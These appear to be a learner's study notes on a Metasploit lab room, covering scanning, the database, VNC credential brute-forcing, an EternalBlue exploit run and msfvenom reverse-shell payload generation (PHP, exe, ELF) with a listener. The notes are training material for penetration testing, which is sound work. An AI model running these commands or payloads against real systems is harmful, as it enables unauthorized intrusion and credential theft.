# Metasploit Exploitation

## Introduction
- In this room, we will learn how to use Metasploit for vulnerability scanning and exploitation. We will also cover how the database feature makes it easier to manage penetration testing engagements with a broader scope. Finally, we will look at generating payloads with msfvenom and how to start a Meterpreter session on most target platforms.
**More specifically, the topics we will cover are:**
  - How to scan target systems using Metasploit.
  - How to use the Metasploit database feature.
  - How to use Metasploit to conduct a vulnerability scan.
  - How to use Metasploit to exploit vulnerable services on target systems.
  - How msfvenom can be used to create payloads and obtain a Meterpreter session on the target system.


## Port Scanning

### Concepts learned
- Metasploit has built-in port/service scanners (generic portscan modules and many service-specific scanners).
- Key options: CONCURRENCY, PORTS, RHOSTS, THREADS, TIMEOUT.
- Metasploit PORTS uses numeric ranges (e.g., 1-10000); this differs from Nmap’s “top 1000” semantics.
- Nmap can be run from msfconsole (exec: nmap ...) for faster / deeper scans.

### Explanation
- Use Metasploit scanners for quick in-console discovery and to feed results directly into exploit/post workflows.
- For broad, accurate, or script-driven scans prefer Nmap (or run Nmap from msfconsole) and import results — Metasploit scanners are handy for targeted, protocol-aware checks (SMB, NetBIOS, HTTP, etc.).
- UDP discovery modules give a fast surface check for common UDP services (DNS, NetBIOS) but are not exhaustive.
- Service-specific scanners (eg. smb_version, smb_enumshares) provide OS, shares, and NetBIOS info useful for prioritising follow-ups.

### Notes
- Find scanners: search portscan or search type:auxiliary <service>
- Load a scanner: use auxiliary/scanner/portscan/tcp
- Inspect requirements: show options
**Typical settings to set:**
 - set RHOSTS 10.10.12.229
 - set PORTS 1-10000
 - set THREADS 10
 - set TIMEOUT 1000
 - Run scan: run
 - Run Nmap from msfconsole: nmap -sS 10.10.12.229 (or exec: nmap ...)
**UDP quick check:**
 - use auxiliary/scanner/discovery/udp_sweep → set RHOSTS <ip> → run
**SMB service probe example:**
 - use auxiliary/scanner/smb/smb_version → set RHOSTS <ip> → run
**Practical tips:**
 - Tune THREADS/CONCURRENCY and DELAY to balance speed vs noise.
 - Check PORTS semantics before scanning to avoid unexpected ranges.
 - Use Metasploit scanners for quick discovery in the same workflow; use Nmap for comprehensive reconnaissance.


## Metasploit Database

### Concepts learned
- Metasploit can use a PostgreSQL backend to store hosts, services, loot, notes and manage projects (workspaces).
- Workspaces isolate projects; setg/unsetg not needed for database usage — use workspace to switch.
- db_nmap runs Nmap and imports results directly into the DB (hosts + services).
- Database lets you query saved hosts/services and reuse them in modules (hosts -R → populate RHOSTS).
- msfdb init (run as non-root/postgres user) and systemctl start postgresql are required to enable DB features.

### Explanation
- Start PostgreSQL, initialize the Metasploit DB, then launch msfconsole and confirm db_status.
- Create or switch workspaces to separate engagements; scans imported with db_nmap are stored per-workspace.
- Use database queries (hosts, services, vulns, loot, notes) to drive modules instead of re-scanning or manually copying IPs.
- Use hosts -R inside a module to load saved DB hosts into a module’s RHOSTS automatically and streamline scanning/exploitation workflows.

### Notes
- Start DB service: systemctl start postgresql
- Initialize DB (run as postgres/non-root): sudo -u postgres msfdb init
- Check DB connection in msfconsole: db_status → should show Connected to msf (postgresql)
- List workspaces: workspace
- Add workspace: workspace -a tryhackme
- Switch workspace: workspace tryhackme
- Delete workspace: workspace -d tryhackme
- Show DB commands help: help db_* (or view Database Backend Commands)
- Run Nmap and import results: db_nmap -sV -p- 10.10.12.229
- List imported hosts: hosts
- List services: services
- Populate module RHOSTS from DB: inside module hosts -R → sets RHOSTS => <ip>
- Query services by name: services -S netbios
**Typical workflow (pointwise):**
 - db_nmap target-range → hosts / services to review → use auxiliary/scanner/... → hosts -R → show options → set required fields → run
 - Useful DB commands: db_import (import scan file), db_export, hosts -h / services -h for search options.
 - Practical tip: use workspaces per engagement and keep DB-backed scans to speed repeatable testing and avoid re-scanning the same targets.


## Vulnerability Scanning

### Concepts learned
- “Low hanging fruit” = easily discovered/exploitable flaws that can grant quick access (e.g., unpatched RCE, weak service auth).
- Effective fingerprinting (ports, services, versions) increases Metasploit’s usefulness for finding vulnerability modules.
- Metasploit provides service-specific scanners (VNC, SMB, FTP, HTTP, etc.) and brute/credential-testing auxiliaries.
- Use module metadata (info) and options (show options) to understand how a scanner works and what to set (RHOSTS, RPORT, wordlists, threads, etc.).

### Explanation
- Prioritise recon: run db_nmap / Nmap to discover hosts/services → inspect services → search Metasploit for relevant scanners/exploits.
- Pick service-specific scanners (e.g., VNC login scanners) to probe authentication or version info rather than blind exploitation.
- Scanner modules often support DB integration (DB_ALL_CREDS, DB_ALL_USERS) and wordlists; tune BRUTEFORCE_SPEED, THREADS, STOP_ON_SUCCESS for performance vs noise.
- Always check module rank and check support; use info to review protocol/version support and references before running.

### Notes
- Search for vulnerability/scanner modules: search vnc or search type:auxiliary vnc
- Load a scanner: use auxiliary/scanner/vnc/vnc_login (or use the index from search)
- Inspect module details: info → shows description, supported versions, references.
- Show options required: show options → common fields: RHOSTS, RPORT, THREADS, PASS_FILE, USER_FILE, BRUTEFORCE_SPEED, STOP_ON_SUCCESS.
**Set target & options:**
  - set RHOSTS 10.10.12.229
  - set RPORT 5900
  - set THREADS 10
  - set PASS_FILE /path/to/wordlist.txt
  - Use DB creds/wordlists if available: set DB_ALL_CREDS true or DB_ALL_USERS true to leverage database entries.
  - Run scanner: run (or exploit for some modules)
**Typical workflow :**
 - db_nmap / nmap → services to identify potential vectors
 - search <service> → pick scanner/exploit → use <module>
 - info → show options → set required fields → run
 - Review results and pivot to appropriate exploit/post modules if successful
**Practical tips:**
- Tune BRUTEFORCE_SPEED and THREADS to balance speed and stealth.
- Use STOP_ON_SUCCESS true to avoid brute-forcing beyond first valid credential.
- Prefer service-specific scanners for richer protocol info (shares, versions, banners) before attempting exploits.
- Check module rank and docs for known side effects (crashes, instability).


## Exploitation

### Concepts learned
- Metasploit’s core role is exploitation: many exploits are available across platforms.
- Typical exploit flow: search → use <module> → info → show options → set/setg → show payloads → set PAYLOAD → exploit/run.
- Payload types matter: inline/single vs staged (stagers + stages) — choose based on size, network reliability, and target constraints.
- Payload selection may expose new options (e.g., LHOST/LPORT for reverse shells).
- Exploit reliability varies (rank) and environment factors (AV, firewall, OS/version) influence success.
- Sessions are created on success and must be managed (list, interact, background, kill, upgrade).

### Explanation
- Use search to find exploits relevant to a service/CVE, then info to read description, targets, side-effects, and payload space.
- show payloads lists compatible payloads; pick one matching architecture, OS, and staged vs inline needs.
- After setting PAYLOAD, run show options again — payloads add required settings (commonly LHOST, LPORT).
- exploit (or run) launches the attack; exploit -z backgrounds the session immediately so you can continue work.
- If exploit fails, try alternate payloads or adjust network/AV constraints; always review module rank and docs for caveats.
- Sessions created (shell or meterpreter) allow post-exploitation: enumerate, pivot, harvest credentials, persist, or cleanup.

### Notes
- Search exploits: search ms17-010 or search type:exploit <keyword>
- Load exploit: use exploit/windows/smb/ms17_010_eternalblue
- View module info: info or info exploit/windows/smb/ms17_010_eternalblue
- Show compatible payloads: show payloads
- Set payload: set PAYLOAD generic/shell_reverse_tcp
- Re-check options (payload-specific): show options → set LHOST 10.10.186.44 ; set LPORT 4444
- Set target options: set RHOSTS 10.10.12.229 ; set RPORT 445
- Run exploit: exploit (or run)
- Run & background: exploit -z
- List sessions: sessions
- Interact with session: sessions -i 1
- Background an interactive session: type background (or CTRL+Z) when in session prompt
**Session management examples:**
 - list inactive sessions: sessions -d
 - terminate session(s): sessions -k 1 or sessions -K (kill all)
 - upgrade shell to meterpreter: sessions -u <id>
 - run a command on session: sessions -c 'whoami' -i <id>
**Practical tips:**
 - Always info and show options before running — verify required fields.
 - Match payload architecture to target and prefer staged when payload size is large or network can fetch stages.
 - Use exploit -z to continue working while session opens in background.
 - If exploit may crash target, prefer check (if supported) or use safe scans first.
 - Document module path, options set, payload chosen, session IDs, and observed behavior for reproducibility.


## MSFVenom

### Concepts Learned
- Msfvenom generates payloads in multiple formats and for different platforms.
- Supports all Metasploit payloads (PHP, exe, dll, elf, etc.).
- Encoders available for payload encoding (not mainly for AV evasion).
- Handlers required to catch reverse shells from generated payloads.
- Can create payloads for Windows, Linux, PHP, ASP, Python, Android, iOS, etc.

### Explanation
**Msfvenom Basics**
 - Replaces msfpayload and msfencode.
 - Generates payloads in raw, executable, or interpreted formats.
 - Lists payloads: msfvenom -l payloads.
 - Lists formats: msfvenom --list formats.
**Encoders**
 - Encode payloads with -e (e.g., php/base64).
 - Encoding obfuscates payloads but doesn’t guarantee bypass of antivirus.
**Generating Payloads**
**Example:**
 - PHP Reverse Shell → msfvenom -p php/reverse_php LHOST=<IP> LPORT=<Port> -f raw > rev_shell.php
 - Windows Executable → msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -f exe > rev_shell.exe
 - Linux ELF → msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -f elf > rev_shell.elf
**Editing Payloads**
 - Some raw outputs (like PHP) may need adjustments: remove comments, add <?php ... ?>.
**Handlers (Catching Shells)**
 - Use exploit/multi/handler to receive connections.
 - Configure with the same payload, LHOST, LPORT as used in msfvenom.
**Example:**
  use exploit/multi/handler
  set payload php/reverse_php
  set lhost <IP>
  set lport <Port>
  run
- Supports both regular shells and Meterpreter sessions.

### Notes
- Always match payload type with target OS and architecture.
- Reverse payloads require listener setup (multi/handler).
- Ensure generated files have proper permissions (e.g., chmod +x for Linux ELF).
- Trial and error may be needed if firewall/AV blocks payload execution.
- LHOST = Attacker machine IP | LPORT = Listening port.


## Keytakeaways
- Metasploit is modular: know modules (exploit, auxiliary, payload, encoder, evasion, nops, post) and where they live.
- msfconsole is the main interface — check the prompt to know your context before running commands.
- Always use <module> → info → show options → set/setg → show payloads → set PAYLOAD → exploit/run.
- Use setg for values you want persistent across modules (LHOST, common RHOSTS); clear with unset / unset all / unsetg.
- Run check when supported to probe vulnerability safely before exploiting.
- Match payload to target: architecture, OS, staged vs inline, and required payload options (LHOST/LPORT).
- Use exploit -z to launch and auto-background sessions when you need to continue working.
- Manage sessions: sessions (list), sessions -i <id> (interact), background / CTRL+Z (background), sessions -k (kill).
- Use auxiliary scanners for quick in-console discovery; use Nmap (db_nmap or exec: nmap) for comprehensive scans.
- Enable and use the Metasploit DB (msfdb init + PostgreSQL) and workspaces to organize engagements and import scan results.
- Leverage DB commands: db_nmap to import scans, hosts / services / vulns to query, and hosts -R to populate RHOSTS.
- For credential/enum tasks, prefer service-specific scanners (SMB, VNC, FTP) and tune THREADS/BRUTEFORCE_SPEED/STOP_ON_SUCCESS.
- Msfvenom creates payloads in many formats (exe, elf, php, asp, raw); ensure output is valid for the target and set a matching handler.
- Use exploit/multi/handler as the listener for msfvenom reverse payloads and set identical payload/LHOST/LPORT values.
- Test encoders/evasion in a lab — they are not guaranteed AV bypasses; prefer staged payloads and careful delivery when stealth is needed.
- Record everything: module path, options set, payload used, workspace, sessions created, and observed behavior for reproducibility and reporting.
- Ethical & safety rule: test only on authorized systems or isolated labs; avoid destructive exploits on production and secure any captured credentials/artifacts.
